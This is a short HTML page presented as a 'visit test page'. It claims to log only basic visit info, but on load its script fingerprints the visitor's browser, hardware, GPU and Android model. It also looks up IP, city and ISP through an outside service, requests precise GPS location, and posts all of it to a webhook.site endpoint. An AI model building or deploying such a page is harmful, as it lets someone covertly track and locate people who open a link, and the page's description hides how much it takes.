<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Visit Test Page</title>
<style>
  body { font-family: sans-serif; max-width: 600px; margin: 60px auto; color: #222; }
  #status { margin-top: 20px; padding: 12px; background: #f4f4f4; border-radius: 6px; }
</style>
</head>
<body>
  <h1>Thanks for visiting</h1>
  <p>This page logs basic visit info (IP, device, timestamp) for testing purposes.</p>
  <div id="status">Collecting info...</div>

  <script>
    async function collectVisitorInfo() {
      const info = {
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages ? navigator.languages.join(', ') : '',
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        colorDepth: window.screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffsetMin: new Date().getTimezoneOffset(),
        referrer: document.referrer || 'direct',
        cpuCores: navigator.hardwareConcurrency || 'unknown',
        deviceMemoryGB: navigator.deviceMemory || 'unknown',
        touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
        cookiesEnabled: navigator.cookieEnabled,
      };

      // Network connection info, if the browser exposes it (mainly Chrome/Android)
      if (navigator.connection) {
        info.connectionType = navigator.connection.effectiveType;
        info.downlinkMbps = navigator.connection.downlink;
      }

      // Attempt to parse an Android model number out of the UA string.
      // iOS/Safari never includes this - Apple strips it deliberately.
      const androidMatch = navigator.userAgent.match(/Android[^;]*;\s*([^)]+)\)/);
      if (androidMatch) {
        info.androidModelRaw = androidMatch[1].trim();
      }

      // GPU renderer string via WebGL - can hint at chipset family
      // (e.g. "Adreno 660" -> Snapdragon 888-series, "Mali-G78" -> certain Exynos/MediaTek chips)
      try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
          const dbgInfo = gl.getExtension('WEBGL_debug_renderer_info');
          if (dbgInfo) {
            info.gpuVendor = gl.getParameter(dbgInfo.UNMASKED_VENDOR_WEBGL);
            info.gpuRenderer = gl.getParameter(dbgInfo.UNMASKED_RENDERER_WEBGL);
          }
        }
      } catch (err) {
        info.gpuLookupError = 'unavailable';
      }

      // IP-based location + ISP, no permission prompt needed
      try {
        const res = await fetch('https://ipapi.co/json/');
        const ipData = await res.json();
        info.ip = ipData.ip;
        info.ipCity = ipData.city;
        info.ipRegion = ipData.region;
        info.ipCountry = ipData.country_name;
        info.isp = ipData.org;         // ISP / network operator name
        info.asn = ipData.asn;         // Autonomous System Number
      } catch (err) {
        info.ipLookupError = 'unavailable';
      }

      // Precise geolocation - triggers a browser permission prompt
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            info.preciseLat = pos.coords.latitude;
            info.preciseLng = pos.coords.longitude;
            finish(info);
          },
          (err) => {
            info.geoError = err.message;
            finish(info);
          },
          { timeout: 5000 }
        );
      } else {
        finish(info);
      }
    }

    // Your unique webhook.site URL
    const ENDPOINT_URL = 'https://webhook.site/c2352c50-5eff-4ac0-8fd7-413d3897049e';

    async function finish(info) {
      document.getElementById('status').innerText = 'Info collected. Sending...';
      try {
        await fetch(ENDPOINT_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(info),
        });
        document.getElementById('status').innerText = 'Done.';
      } catch (err) {
        document.getElementById('status').innerText = 'Failed to send info.';
      }
    }

    window.addEventListener('load', collectVisitorInfo);
  </script>
</body>
</html>
